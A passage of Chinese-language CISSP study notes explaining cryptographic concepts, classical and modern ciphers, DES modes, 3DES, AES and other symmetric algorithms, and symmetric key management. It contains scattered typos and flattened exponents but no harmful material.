不可否认性为接收者提供了担保，保证消息确实来自发送者而不是来自伪装成发送者的人。不可否认性能够防止发送者宣称原先从未发送过信息(也被称为否认消息)。秘密密钥(或对称密钥)密码系统(如简单的替代密码)并不提供对不可否认性的保证。</p><h4 id="6-2-2-密码学概念"><a href="#6-2-2-密码学概念" class="headerlink" title="6.2.2 密码学概念"></a>6.2.2 密码学概念</h4><p>　　消息在成为编码形式之前，被称为明文消息，并且在描述加密函数时使用字母P表示。消息的发送者使用密码学算法将明文消息加密为密文消息，并且使用字母C表示。消息通过一些物理的或电子的方式被传送给接收者。接收者随后使用预先确定的算法对密文消息进行解密，从而得到明文形式的消息。<br>　　所有密码学算法都依赖密钥来维护其安全性。在很大程度上，密钥只不过是一个数字。密钥往往是一个非常大的二进制数，不过仍然是一个数字。每种算法都具有一个特定的密钥空间。密钥空间是一段值的范围，此范围内的值可作为密钥算法的有效密钥。密钥空间由其位的长度定义。位的长度只不过是密钥中的比特数或位数(0s和1s)。密钥空间的范围为： 从所有位全部为0到所有位全部为1。如果采用另一种方式表示，那么密钥空间的范围为0到2n，其中n是密钥的位的长度。因此，128位密钥的值可以从0到2128(大约为3.40282367* 10^38，这是一个相当大的数字)。保护密钥的安全是非常重要的。事实上，从密码学获得的所有安全性就只能依赖于保证秘密使用密钥的能力。</p><h4 id="6-2-3-密码学的数学原理"><a href="#6-2-3-密码学的数学原理" class="headerlink" title="6.2.3 密码学的数学原理"></a>6.2.3 密码学的数学原理</h4><h5 id="1-二进制数学"><a href="#1-二进制数学" class="headerlink" title="1. 二进制数学"></a>1. 二进制数学</h5><p>　　二进制数学定义了一些形成所有计算机神经系统的比特和字节所使用的规则。计算机依赖的二进制系统起源于电。在电流中，只有两种可能的状态： 开(代表存在电流)和关(代表没有电流)。电子设备执行的所有计算都必须利用这些术语来表达，这就出现了现代电子学中对二进制的使用。</p><h5 id="2-逻辑运算"><a href="#2-逻辑运算" class="headerlink" title="2. 逻辑运算"></a>2. 逻辑运算</h5><p>　　密码学的二进制数学使用多种逻辑函数来操纵数据。</p><ul><li><p>AND<br>AND 运算(用符号^表示)可以检查两个值是否都为真。在二进制数学中，每个变量都只有两种可能的值，因而为且也函数准备了4种可能的输入。</p></li><li><p>OR<br>OR运算(用符号v来表示)可以检查是否至少有一个输入值为真，只有在两个输入值都为假时，OR函数的结果才会返回假。</p></li><li><p>NOT<br>NOT 运算(用符号~或!来表示)简单地将输入值取反。</p></li><li><p>XOR<br>异或(XOR)操作通常用符号⊕表示。只有在一个输入值为真时，XOR函数的结果才为真。如果两个输入值都为假或都为真，那么XOR 函数的结果为假。</p></li></ul><h5 id="3-模函数"><a href="#3-模函数" class="headerlink" title="3. 模函数"></a>3. 模函数</h5><p>　　计算机本来也不理解小数系统，并且这些余数在计算机执行很多数学运算时起到了至关重要的作用。模函数十分简单，也就是在完成除法运算后得到余数。</p><h5 id="4-单向函数"><a href="#4-单向函数" class="headerlink" title="4. 单向函数"></a>4. 单向函数</h5><p>　　单向函数是一种数学运算，它可以通过所有可能的输入值组合得出结果，但是反向得出输入值却是不可能的。公钥密码系统都建立在单向函数的基础上。</p><h5 id="5-随机数"><a href="#5-随机数" class="headerlink" title="5. 随机数"></a>5. 随机数</h5><p>　　密码学往往通过在加密过程中添加随机性来获得强度。实现这个目标的一种方法是使用随机数。随机数是随机数字发生器，起到了数学函数中占位符变量的作用。执行数学函数时，占位符会被替换为在处理时刻生成的随机数。每次使用数学函数时，随机数都会产生一个独特的数字。随机数的一个更为人接受的示例是初始向量(Initialization Vector，IV)，这是一个与分组长度相同的随机比特串，并且与原始消息相异或。在每次使用相同密钥加密相同的消息时，IV都被用于创建独特的密文。</p><h5 id="6-零知识证明"><a href="#6-零知识证明" class="headerlink" title="6. 零知识证明"></a>6. 零知识证明</h5><p>　　密码学的一个优点是建立了这样的机制： 在不向第三方揭示事实本身的情况下向第三方证明对事实的了解。这种机制通常涉及密码和其他秘密的身份认证。</p><h5 id="7-分割知识"><a href="#7-分割知识" class="headerlink" title="7. 分割知识"></a>7. 分割知识</h5><p>　　如果执行某个操作所需的信息或权限在多个用户之间分配时，任何一个人都没有足够的权限来危害环境的安全性。单个解决方案中包含的这种职责分离和两人控制被称为分割知识。分割知识的最佳示例就是密钥托管的概念。通过使用密钥托管，密码密钥、数字签名甚至数字证书，可以被存储在或备份在一种被称为密钥托管数据库的特殊数据库中。</p><h5 id="8-工作函数"><a href="#8-工作函数" class="headerlink" title="8. 工作函数"></a>8. 工作函数</h5><p>　　通过使用工作函数或工作因数，从成本和/或时间方面来度量所有努力，就可以度量密码学系统的强度。通常，针对加密系统执行完全穷举攻击所需的时间和努力，就是工作函数所表示的内容。密码系统提供的安全性和保护与工作函辈U因数的值成正比。工作函数的大小应当与受保护资产的相对值匹配。工作函数只需稍大于受保护资产的时间值。换句话说，所有安全性(包括密码学)都应当是有效益的和有效率的。保护某个资产所花费的成本不能超过这个资产自身的价值，但是一定要保证提供足够的保护。因此，如果信息由于时间的推移而失去价值，那么工作函数的大小只需确保在数据失去价值前提供保护即可。</p><h4 id="6-2-4-密码"><a href="#6-2-4-密码" class="headerlink" title="6.2.4 密码"></a>6.2.4 密码</h4><h5 id="1-编码与密码"><a href="#1-编码与密码" class="headerlink" title="1. 编码与密码"></a>1. 编码与密码</h5><p>　　编码是密码学系统中表示词汇或短语的符号，有时是秘密的，但是不一定提供机密性。编码的常见示例是执法机构使用的通信”10系统”。 在这个系统中，语句”我收到你的信息，并且理解其含义”被表示成编码短语”10-4”这个编码是众人皆知的，但是它确实提供了通信的简易性。一些编码是秘密的。为了传输机密的消息，这些编码可能使用数学函数或密码字典来表示词汇、短语或句子。另一方面，密码总是意味着隐藏消息的真实含义。密码使用各种技术修改和/或重新排列消息中的字符或比特，从而实现机密性。在比特(也就是二进制编码的单个位)、字符(也就是ASCII码消息的单个字符)或分组(也就是一条消息的固定长度分段，通常用比特数表示)的基础上，密码将消息从明文转换为密文。</p><h5 id="2-换位密码"><a href="#2-换位密码" class="headerlink" title="2. 换位密码"></a>2. 换位密码</h5><p>　　换位密码使用某种加密算法重新排列明文消息中的字母，从而形成密文消息。解密算法只需反演加密转换过程就可以得到原始消息。</p><h5 id="3-替代密码"><a href="#3-替代密码" class="headerlink" title="3. 替代密码"></a>3. 替代密码</h5><p>　　替代密码使用加密算法将明文消息中的每一个字符或比特都替换为不同的宇符。与换位密码一样，有很多替代密码比本章提供的示例更复杂。多字母替代密码在相同的消息中使用多个字母表来阻碍解密操作。多字母替代密码的一个著名示例是Vigenere密码。虽然多宇母替代能够防范直接的频率分析，但是容易遭受二阶形式的频率分析(也被称为周期分析攻击，这种攻击基于密钥的重复使用进行频率检查)。</p><h5 id="4-一次性填充"><a href="#4-一次性填充" class="headerlink" title="4. 一次性填充"></a>4. 一次性填充</h5><p>　　一次性填充是一种极为强大的替代密码。一次性填充对明文消息的每个字母都使用一个不同的字母表。它们可以通过下面的加密函数来表示，其中K是以C表示的字母的加密密钥：</p><p><center>c = (P + K) mod 26</center><br>　　通常，一次性填充被记为插入函数的一个很长的数字序列。一次性填充的巨大好处是： 如果运用得当，它是一个不可破解的加密方案。由于不存在重复的字母替代模式，这使得密码分析工作徒劳无益。然而，为了确保算法的完整性，必须满足下列几个要求：</p><ul><li>加密密钥必须随机生成。使用一个短语或书中的一段话会引入密码分析人员破译这个编码的可能性。</li><li>一次性填充必须进行物理保护，以防泄露。如果敌人具有这个一次性填充的副本，那么他们就可以轻易地破译加密的消息。</li><li>每个一次性填充必须只使用一次。如果填充被重复使用，那么密码分析人员可以比较多个使用相同填充的加密消息中的相似之处，井有可能确定使用的密钥值。</li><li>密钥必须至少与被加密的消息一样长，这是因为每个密钥元素都只对消息中的一个字符进行编码。</li></ul><p>　　一次性填充一直被用于保护极其敏感的通信，不能被广泛使用的主要障碍是很难生成，以及分发和保护所需的冗长密钥。由于密钥的长度问题，一次性填充在实际中只可用于短消息。</p><h5 id="5-滚动密钥密码"><a href="#5-滚动密钥密码" class="headerlink" title="5. 滚动密钥密码"></a>5. 滚动密钥密码</h5><p>　　密码学的许多脆弱性都涉及密钥的有限长度。通过在加密和解密期间为每个密码转换使用不同的字母表，一次性填充避免了这些脆弱性。然而，因为要求填充的物理交换，所以一次性填充难以实现。对于这个难题，一个常见的解决方案是使用漆动密钥密码，也被称为书籍密码。在这种密码中，加密密钥与消息本身一样辰，并且往往从一般的书籍中选取。</p><h5 id="6-分组密码"><a href="#6-分组密码" class="headerlink" title="6. 分组密码"></a>6. 分组密码</h5><p>　　分组密码按消息的”组块”或分组进行操作，并且对整个消息分组同时应用加密算法。换位密码就是分组密码的一个例子。在挑战/响应算法中使用的简单算法，是取出完整的词汇井且逆向排列字母。更加复杂的柱状换位密码对整条消息(或一段消息)进行操作，并且使用换位算法和保密密钥对消息进行加密。大多数现代加密算法都实现了某些类型的分组密码。</p><h5 id="7-流密码"><a href="#7-流密码" class="headerlink" title="7. 流密码"></a>7. 流密码</h5><p>　　流密码对消息、(或数据流)中的每个字符或每一位进行操作，每次只处理一个字符/一位。凯撒密码就是流密码的一个例子。一次性填充也是一种流密码，这是因为该算法对明文信息中的每个宇符独立进行操作。流密码也可以作为一种分组密码使用。在此类情况下，某个缓冲区被填满实时数据，随后这些数据作为分组进行加密井传送给接收方。</p><h5 id="7-混淆与扩散"><a href="#7-混淆与扩散" class="headerlink" title="7. 混淆与扩散"></a>7. 混淆与扩散</h5><p>　　密码学算法依靠两种基本的操作来隐藏明文信息： 、混淆与扩散。混淆出现在明文和密钥的关系十分复杂时，此时攻击者不能通过继续修改明文和分析产生的密文来确定密钥。扩散出现在明文的改变导致多种变化时，这些变化被扩散到整个密文中。</p><h3 id="6-现代密码学"><a href="#6-现代密码学" class="headerlink" title="6. 现代密码学"></a>6. 现代密码学</h3><p>　　为了实现密码学的机密性、完整性、身份认证和不可否认性目标，现代密码系统利用计算复杂的算法和长密钥。</p><h4 id="6-3-1-密钥"><a href="#6-3-1-密钥" class="headerlink" title="6.3.1 密钥"></a>6.3.1 密钥</h4><p>　　在密码学的早期，其中一条主导原则就是” 通过隐匿实现安全”。密码学家们认为保护加密算法安全的最好办法就是对外人隐藏算法的细节。旧的密码系统要求通信双方保持对信息加密和解密所使用算法的安全性，井且不对第三方泄露。算法的任何泄露都可能导致对于对整个系统的破坏。<br>　　现代密码系统并不依赖于其算法的安全性。通过向公众开放审查，实际上也改善了算法的安全性。计算机安全机构对于算法的广泛分析，允许从业人员发现并纠正潜在的安全脆弱性，并且确保他们用于保护通信的算法尽可能安全。现代密码系统不依赖于保密的算法，而是依赖于具体的用户或用户组专用的一个或多个密钥。对换位密码的讨论中曾经提到过，柱状换位中使用的密钥被用于指导加密和解密操作。然而，只要选择了外人猜不出的密钥，柱状换位就可以被用于双方的安全通信。只要密钥的安全性得到维护，那么就不必担心第三方会知道算法的细节。</p><h4 id="6-3-2-对称密钥算法"><a href="#6-3-2-对称密钥算法" class="headerlink" title="6.3.2 对称密钥算法"></a>6.3.2 对称密钥算法</h4><p>　　对称密钥算法依赖于一个”共享的秘密”加密密钥，该密钥会被分发给所有参与通信的成员。所有通信成员都使用这个密钥进行消息的加密和解密，因此发送者和接收者都拥有共享密钥的副本。通信两端会使用相同的密钥加密和解密消息。当使用很长的密钥时，对称加密难以被破解。对称密钥算法主要被用于执行批量加密，并且只为安全服务提供机密性。对称密钥密码学也被称为秘密密钥密码学和私有密钥密码学。<br><img src="/notes/cissp学习笔记（6）——密码学与对称加密算法/对称密钥密码学.png"><br>对称密钥密码学具有下列几个弱点：</p><ul><li><strong>密钥分发是一个主要问题</strong> 在使用对称密钥协议建立通信之前，通信参与者必须具备一种安全交换密钥的方法。如果没有可用的安全电子通道，那么往往必须使用离线的密钥分发方法(已不属于交换) 。</li><li><strong>对密钥密码学井未实现不可否认性</strong> 由于任意通信方都可以利用共享的密钥对消息进行加密和解密，因此无法分辨指定消息的来源。</li><li><strong>这种算法不可扩展</strong> 对于大的用户组来说，使用对称密钥密码进行通信非常困难。只有在每个可能的用户组合共享私有密钥时，组中个人之间的安全专有通信才能实现。</li><li><strong>密钥必须经常更新</strong> 每当有成员离开用户组时，所有涉及这个成员的密钥都必须被抛弃。</li></ul><p>　　对称密钥密码学的主要强度在于能够以极快的速度进行操作。对称密钥算法的速度很快，通常是非对称密钥算法的1000倍到10000倍之间。鉴于其数学特性，对称密钥密码学还可以在硬件上实现，这为更高速度的运行创造了机会。</p><h4 id="6-3-3-非对称密钥算法"><a href="#6-3-3-非对称密钥算法" class="headerlink" title="6.3.3 非对称密钥算法"></a>6.3.3 非对称密钥算法</h4><p>　　非对称密钥算法也被称为公钥算法，它为对称密钥加密的弱点提供了解决方案。在这个系统中，每个用户都有两个密钥： 一个在所有用户之间共享的公钥，以及另一个只有用户自己知道并保管的私钥。但是让人意想不到的是： 相对立的和相关的密钥必须被先后应用于加密和解密。换句话说，如果使用公钥加密消息，那么只有相关的私钥能够进行解密，反之亦然。<br><img src="/notes/cissp学习笔记（6）——密码学与对称加密算法/非对称密钥密码学.png"><br>下面列出了非对称密钥密码学的主要优点：</p><ul><li><strong>增加新用户只需要生成一对公钥-私钥对</strong> 这个新用户与非对称密码系统中的所有用户通信时都使用这对相同的密钥，从而使得算法非常容易扩展。</li><li><strong>从非对称系统中更容易删除用户</strong> 非对称算法提供了一种密钥撤消机制，这个机制准许密钥被取消，从而能够有效地从非对称系统中删除用户。</li><li><strong>只有在用户的私钥被破坏时，才需要进行密钥重建</strong> 如果某位用户离开了公司，那么系统管理员只需要简单地将该用户的密钥作废即可。其他密钥都不会被破坏，因此其他用户都不需要进行密钥重建。</li><li><strong>非对称密钥加密提供了完整性、身份认证和不可否认性</strong> 如果某位用户没有与其他个体共享其私钥，那么具有该用户签名的消息就是正确无误的，并且具有特定的来源，在以后的任何时刻都不能被否认。</li><li><strong>密钥分发是一个简单的过程</strong> 希望加入非对称密码系统的用户，只需要使他们的公钥对于所有与他们进行通信的人来说可用就可以了。目前尚无办法从公钥导出私钥。</li><li><strong>不需要预先存在通信链接</strong> 两个个体可以从通信一开始就进行安全的通信。非对称密码学并不要求预先存在能够提供安全数据交换机制的关系。</li></ul><p>　　公钥密码学的主要弱点是运算速度慢。因此，很多需要安全传输大量数据的应用程序会使用公钥密码学建立连接，然后交换对称密钥。会话任务的剩余部分随后来用对称密码学开始运作。下表比较了对称和非对称密码学系统。仔细查看这个表可以发现，一种系统中的弱点恰好与另一种系统中的优点互补。</p><table><thead><tr><th>对称密码学系统</th><th>非对称密码学系统</th></tr></thead><tbody><tr><td>单个共享的密钥</td><td>密钥对</td></tr><tr><td>带外交换</td><td>带内交换</td></tr><tr><td>不可扩展</td><td>可扩展</td></tr><tr><td>快速</td><td>慢速</td></tr><tr><td>批量加密</td><td>小块数据分组、数字签名、数字封装、数字证书</td></tr><tr><td>机密性</td><td>完整性、机密性、身份认证、不可否认性</td></tr></tbody></table><h4 id="6-3-4-散列算法"><a href="#6-3-4-散列算法" class="headerlink" title="6.3.4 散列算法"></a>6.3.4 散列算法</h4><p>目前常用的一些散列算法：</p><ul><li>消息摘要2(MD2)</li><li>消息摘要5(MD5)</li><li>安全散列算法(SHA-0、SHA-l和SHA-2)</li><li>基于散列的消息身份认证代码(Hashed Message Authentication Code，HMAC)</li></ul><h3 id="6-4-对称密码"><a href="#6-4-对称密码" class="headerlink" title="6.4 对称密码"></a>6.4 对称密码</h3><h4 id="6-4-1-数据加密标准"><a href="#6-4-1-数据加密标准" class="headerlink" title="6.4.1 数据加密标准"></a>6.4.1 数据加密标准</h4><p>　　美国政府在1977年公布了数据加密标准(DES)，并且将之作为向所有政府通信而提议的标准密码系统。由于该算法中的缺陷，密码学界和政府不再认为DES是安全的。大家普遍相信情报机构已经能轻易破解DES加密的信息。DES在2001年12月被高级加密标准取代。<br>　　DES是一个64位的分组密码，具有5种操作模式： 电子代码本(Electronic CodeBook，ECB)模式、密码分组链接(Cipher Block Chaining，CBC)模式、密码回馈(Cipher FeedBack，CFB)模式以及输出回馈(Output FeedBack，OFB)模式和计数(CounTeR，CTR)模式。这些模式将在接下来的内容中进行阐述。所有DES模式每次处理64位的明文，并且生成一个64位的密文分组。DES使用的密钥长度为56位。DES 利用长序列的异或(XOR)操作生成密文。每个加密/解密操作都要重复16次这个过程，每次重复通常被称为”一轮”加密，因此DES要执行16轮加密。</p><h5 id="1-电子代码本模式"><a href="#1-电子代码本模式" class="headerlink" title="1. 电子代码本模式"></a>1. 电子代码本模式</h5><p>　　电子代码本(ECB)模式是最容易了解的模式，但安全性最差。这个算法每次处理一个64位分组，它简单地使用所选择的密钥对这个分组进行加密。这意味着如果算法多次遇到相同的分组，那么将产生完全相同的加密分组。除了最短传输之外，这个脆弱性使得通过ECB模式进行传输并不现实。在日常使用中，ECB只被用于交换少量数据。例如，启动其他DES模式的密钥和参数以及数据库中的单元。</p><h5 id="2-密码分组链接模式"><a href="#2-密码分组链接模式" class="headerlink" title="2. 密码分组链接模式"></a>2. 密码分组链接模式</h5><p>　　在密码分组链接(CBC)模式中，未加密文本的每个分组在使用DES算法加密之前，都与前一密文分组进行异或操作。解密过程简单地将密文解密，并且反向执行异或操作。CBC创建了一个IV，并且将这个IV与消息的第一个分组相异或，从而每次操作都生成独特的输出。IV必须被发送给接收方，我们既可以将IV以明文形式置于完整的密文之前，也可以使用与消息所用的相同的密钥通过ECB加密模式保护它。在使用CBC 模式时，需要考虑的一个重要问题是错误传播，也就是如果一个分组在传输中被破坏，那么这个分组将无法解密，并且下一个分组也是如此。</p><h5 id="3-密码回馈模式"><a href="#3-密码回馈模式" class="headerlink" title="3. 密码回馈模式"></a>3. 密码回馈模式</h5><p>　　密码回馈(CFB)模式是流密码形式的CBC。换句话说，CFB针对实时生成的数据进行操作。不过，CFB并不将消息分为若干分组，而是使用相同分组大小的内存缓冲区。在缓冲区被填满时，对数据进行加密并发送给接收方。接着，系统等待下一个缓冲区被新生成的数据填满，然后继续进行加密和传输。除了将先前存在的数据变化为实时数据，CFB的操作方式与CBC一样，也使用了IV和链接。</p><h5 id="4-输出回馈模式"><a href="#4-输出回馈模式" class="headerlink" title="4. 输出回馈模式"></a>4. 输出回馈模式</h5><p>　　在输出回馈(OFB)模式中，DES的操作样式几乎与在CFB模式中的操作样式完全相同。不过，DES并不将明文分组与前一个密文分组的加密版本相异或，而是将明文与某个种子值相异或。对于第一个被加密的分组来说，初始向量被用于创建种子值。通过对先前的种子值运行DES算法，就可以派生出之后的种子值。OFB模式的主要优点是不存在链接功能，并且传输错误不会通过传播影响之后分组的解密。</p><h5 id="5-计数模式"><a href="#5-计数模式" class="headerlink" title="5. 计数模式"></a>5. 计数模式</h5><p>　　在计数(CTR)模式中运行的DES使用的流密码，类似于在CFB和OFB模式中使用的流密码。不过，这种模式并不根据前一个种子值的结果为每个加密/解密操作创建种子值，而是使用一个简单的、每次操作后都增加的计数。与OFB模式一样，CTR模式中也不传播错误。</p><h4 id="6-4-2-三重数据加密算法-3DES"><a href="#6-4-2-三重数据加密算法-3DES" class="headerlink" title="6.4.2 三重数据加密算法(3DES)"></a>6.4.2 三重数据加密算法(3DES)</h4><p>　　3DES具有4种版本。第1种版本只是使用三个不同的密钥(K1、K2和K3)对明文加密三次。它被称为DES-EEE3模式(三个E表示存在三个加密操作，而数字3表示使用三个不同的密钥)，这种模式可以利用下面的符号来表示，其中E(K，P)表示使用密钥K加密明文P：</p><p><center>E(K1，E(K2，E(K3，P)))</center><br>　　DES-EEE3 具有的密钥的有效长度为168位。<br>　　第2种3DES版本DES-EDE3也使用三个密钥，但是将第二个加密操作替换为解密操作，如下所示：</p><p><center>E(K1，D(K2，E(K3，P)))</center><br>　　第3种3DES版本DES-EEE2只使用两个密钥Kl和K2，如下所示：</p><p><center>E(K1，E(K2，E(Kl，P)))</center><br>　　第4种3DES版本DES-EDE2也使用两个密钥，但是在中间使用一个解密操作，如下所示：</p><p><center>E(K1，D(K2E(K1，P)))</center><br>　　第3种和第4种3DES 版本具有的密钥的有效长度都为112位。</p><h4 id="6-4-3-国际数据加密算法-IDEA"><a href="#6-4-3-国际数据加密算法-IDEA" class="headerlink" title="6.4.3 国际数据加密算法(IDEA)"></a>6.4.3 国际数据加密算法(IDEA)</h4><p>　　国际数据加密算法(IDEA)的分组密码是针对DES算法的密钥长度不够而开发的。与DES一样，IDEA对64位的明文/密文分组进行操作。然而，国际数据加密算法采用128位的密钥进行操作。这个密钥随后在一系列操作中被分解成52个16位的子密钥。这些子密钥接着使用异或和模运算的组合对输入的文本进行操作，从而生成输入消息的加密/解密版本。IDEA能够在DES使用的4种模式(ECB、CBC、CFB和OFB)中工作。</p><h4 id="6-4-4-Blowfish"><a href="#6-4-4-Blowfish" class="headerlink" title="6.4.4 Blowfish"></a>6.4.4 Blowfish</h4><p>　　Bruce Schneier的Blowfish分组密码是DES和IDEA的另一种选择。与它的这些前辈们一样，Blowfish对64位文本分组进行操作。然而，Blowfish扩展了IDEA的密钥强度，甚至准许使用变长密钥，范围从相对不安全的32位到相当难破解的448位。很显然，较长的密钥将导致加密/解密时间的相应增加。不过，计时试验已经表明，Blowfish是比IDEA和DES更快的算法。</p><h4 id="6-4-5-Skipjack"><a href="#6-4-5-Skipjack" class="headerlink" title="6.4.5 Skipjack"></a>6.4.5 Skipjack</h4><p>　　Skipjack算法由美国政府在联邦信息处理标准(Federal Information Processing Standard，FIPS)185，即托管加密标准证书(Escrowed Encryption Standard，EES)中批准使用。与许多分组密码一样，Skipjack对64位的文本分组进行操作。这种算法使用一个80位的密钥，并且支持DES支持的相同4种操作模式。</p><h4 id="6-4-6-高级加密标准-AES"><a href="#6-4-6-高级加密标准-AES" class="headerlink" title="6.4.6 高级加密标准(AES)"></a>6.4.6 高级加密标准(AES)</h4><p>　　AES密码准许使用三种密钥强度：128位、192位和256位。AES最初的规范支持128位分组的处理，但是Rijndael超出了这个规范，它准许密码学家使用与密钥长度相等的分组大小。如下所示，加密的轮数依赖于所边的密钥长度：</p><ul><li>128位密钥需要10轮加密。</li><li>192位密钥需要12轮加密。</li><li>256位密钥需要14轮加密。</li></ul><p>下表列出了某些常见且著名的对称加密算法及其分组大小和密钥大小：</p><table><thead><tr><th>算法名</th><th>分组大小(单位为位)</th><th>密钥大小(单位为位)</th></tr></thead><tbody><tr><td>数据加密标准(DES)</td><td>64</td><td>56</td></tr><tr><td>三重DES(3DES)</td><td>64</td><td>112或168</td></tr><tr><td>高级加密标准(AES)</td><td>128</td><td>128、192、256</td></tr><tr><td>Rijndael</td><td>可变</td><td>128、192、256</td></tr><tr><td>Twofish</td><td>128</td><td>1-256</td></tr><tr><td>Blowfish(通常在SSH中使用)</td><td>64</td><td>32-448</td></tr><tr><td>IDEA(在PGP中使用)</td><td>64</td><td>128</td></tr><tr><td>基于RSA的Rivest密码5(RC5)</td><td>32、64、128</td><td>0-2040</td></tr><tr><td>基于RSA的Rivest密码4(RC4)</td><td>流式</td><td>128</td></tr><tr><td>基予RSA的Rivest密码2(RC2)</td><td>64</td><td>128</td></tr><tr><td>Skipjack</td><td>64</td><td>80</td></tr></tbody></table><h4 id="6-4-7-对称密钥管理"><a href="#6-4-7-对称密钥管理" class="headerlink" title="6.4.7 对称密钥管理"></a>6.4.7 对称密钥管理</h4><p>　　由于加密密钥中包含的信息对于密码系统而言是至关重要的，因此密码系统的管理员和用户必须采取特殊的措施以保护密钥材料的安全。这些安全措施被统称为密钥管理实践。它们包含密钥的生成、分发、存储、销毁、恢复和托管。</p><h5 id="1-创建和分发对称密码"><a href="#1-创建和分发对称密码" class="headerlink" title="1. 创建和分发对称密码"></a>1. 创建和分发对称密码</h5><ul><li><strong>离线分发</strong> 在技术方面最简单的方法涉及密钥材料的物理交换。一方向另一方提供包含密钥的一张纸或一份存储介质。在很多硬件加密设备中，密钥材料以电子设备的形式存在，这类似于插入到加密设备中的真实的钥匙。然而，这些方法都具有各自固有的缺陷。如果通过电子邮件发送密钥材料，那么密钥材料就可能被截获。电话可能会被窃听。包含密钥的纸张则可能被无意丢进废纸篓或丢失。</li><li><strong>公钥加密</strong> 许多通信人员希望在没有密钥分发之争的情况下获得密钥加密的速度优势。因此，许多人使用公钥加密来建立初始的通信链接。一旦链接成功建立，并且双方对相互的身份都感到满意，那么他们就会在安全的公钥链接上交换密钥。随后，通信双方从基于公钥算法的通信进入基于秘密密钥算法的通信，并且能够享受快速的处理过程。一般而言，与公钥加密相比，私有密钥加密的速度快数千倍。</li><li><strong>Diffie-Hellman算法</strong> 某些情况下，无论是公钥加密还是离线分发，都是不充分的。双方可能需要相互通信，但是他们没有物理手段交换密钥材料，并且没有适当的公钥基础设施来促进秘密密钥的交换。在这样的情况下，像Diffie-Hellman这样的密钥交换算法被证明是极为有用的机制。</li></ul><h5 id="2-存储和销毁对称密钥"><a href="#2-存储和销毁对称密钥" class="headerlink" title="2. 存储和销毁对称密钥"></a>2. 存储和销毁对称密钥</h5><p>　　在对称密钥加密中，另一个主要的挑战是在密码系统中使用的密钥必须进行安全保管。以下给出了存储加密密钥的最佳实践：</p><ul><li>永远不要将加密密钥存储在存放加密数据的同一个系统中，这将使攻击者更容易进行攻击!</li><li>对于敏感的密钥，可以考虑两个不同的人分别持有密钥的一半。他们必须合在一起才能构成完整的密钥。这是众所周知的知识分割原则(己在本章前面提到)。</li></ul><p>当知道密钥的用户离开组织或不再被允许访问通过密钥包含的材料时，密钥必须更改，同时使用该密钥进行加密的所有材料必须用新的密钥进行重新加密。销毁一个密钥并将一个用户从对称密码系统中移除是困难的，这也是组织转而使用非对称算法的一个重要原因。</p><h5 id="3-密钥托管"><a href="#3-密钥托管" class="headerlink" title="3. 密钥托管"></a>3. 密钥托管</h5><p>　　在过去10年中，人们提议通过下列两种主要途径进行密钥托管：</p><ul><li><strong>公平密码系统</strong> 在这种托管方法中，通信中使用的私有密钥被分为两个或多个部分，这些部分都被交给独立的第三方。每个部分本身都是无用的，但是通过重新组合可以获得私有密钥。政府获得法律授权访问特定的密钥时，需要向所有第三方提供法院的证据，随后才能重新组装这个私有密钥。</li><li><strong>托管加密标准</strong> 这种托管方法向政府提供解密密文的技术手段。这个标准是本章前面讨论的Skipjack算法的基础。</li></ul><h4 id="6-4-8-密码生命周期"><a href="#6-4-8-密码生命周期" class="headerlink" title="6.4.8 密码生命周期"></a>6.4.8 密码生命周期</h4><p>　　安全专家在选择一个加密算法和相应的管理控制措施时必须考虑密码的生命周期以确保算法、协议和选择的密钥长度足以保存密码系统的完整性，以确保能够用于保护所需时间内信息的完整性和安全性。安全专家可以使用以下算法和协议管理控制：</p><ul><li>确定组织内可以接受和使用的加密算法(例如，AES、3DES和RSA) 。</li><li>基于传输信息的敏感性确定每个算法可接受使用的密钥长度。</li><li>列出可以使用的安全传输协议(如SSL和TLS) 。</li></ul><h3 id="6-5-考试要点"><a href="#6-5-考试要点" class="headerlink" title="6.5 考试要点"></a>6.5 考试要点</h3><ul><li><strong>理解机密性、完整性和不可否认性在密码系统中扮演的角色</strong> 机密性是密码学的一个主要目标，它确保信息不对未授权的个人泄漏，并且准许加密信息、以在开放的网络中自由传输。对称和非对称密码系统都能够保证机密性。完整性为消息的接收方提供了消息在发送者建立和接收者接收到的时间范围内没有被(有意或无意)修改的保证。对称和非对称密码系统都能够保证完整性。不可否认性提供了不可否认的证据，从而证明消息的发送者确实是这个消息的作者。它防止发送者否认他们发送了原始信息。</li><li><strong>了解如何使用密码系统达到身份认证的目标</strong> 身份认证提供了对用户身份的保证。使用身份认证的一种可能方案是挑战/响应协议，其中的远程用户被要求使用只有通信双方知道的密钥对消息进行加密。对称和非对称的密码系统都可以实现身份认证。</li><li><strong>熟悉密码学的基本术语</strong> 当发送者希望向接收者传送一份私有消息时，发送者会取出明文(未加密的)消息，并且使用某种算法和某个密钥对明文消息进行加密，从而生成发送给接收者的密文消息。接收者随后使用相似的算法和密钥对密文进行解密，并且重建原始的明文消息以供查看。</li><li><strong>理解编码和密码之间的区剔，井且能够解释密码的基本类型</strong> 编码是对词汇或短语操作的符号密码学系统，有时是隐秘的，但是并不能永远提供机密性。不过，密码永远意味着对消息的真实含义进行隐藏。了解下列密码类型的工作方式： 换位密码、替代密码(包括一次性填充)、流密码以及分组密码。</li><li><strong>了解成功应用一次性填充的要求</strong> 要获得成功的一次性填充，密钥必须随机生成，并且不使用任何己知的模式。密钥必须至少和被加密的消息一样长。填充必须防止物理泄露，并且每个填充在被丢弃前必须只使用一次。</li><li><strong>理解零知识证明的概念</strong> 零知识证明是一个通信概念。正如数字签名和数字证书一样，零知识证明交换特定类型的信息，但是不传输实际的数据。</li><li><strong>理解知识分割</strong> 分割知识意味着执行某个操作所需的知识或权限在多个用户之间分配，这样可以确保任何一个人都没有足够的权限来危害环境的安全性。”M of N控制”是分割知识的一个示例。</li><li><strong>理解工作函数(工作因数)</strong> 工作函数或工作因数通过度量解密消息所需的成本和/或时间，来度量密码学系统的强度。通常，针对加密系统执行完全穷举攻击所需的时间和努力就是工作函数所表示的内容。密码系统提供的安全性和保护与工作函数/因数的值成正比。</li><li><strong>理解密钥安全性的重要性</strong> 密码学密钥为密码系统提供秘密性的必要组件。现代密码系统使用至少128位的密钥来提供足够的安全性。通常，人们都赞同数据加密标准。(DES)56位密钥的长度己无法提供足够的安全性。</li><li><strong>了解对称和非对称密钥系统之间的差异</strong> 对称密钥密码系统(或密钥密码系统)依赖于一个共享密钥的使用。它们的速度远远快于非对称算法，但是缺乏对可扩展性、简单密钥分发和不可否认性的支持。非对称密码系统对双方之间的通信使用公共/私钥对，但是要比对称算法的操作速度慢得多。</li><li><strong>能够解释数据加密标准(DES)和三重DES(3DES)的基本操作模式</strong> 数据加密标准具有4 种操作模式： 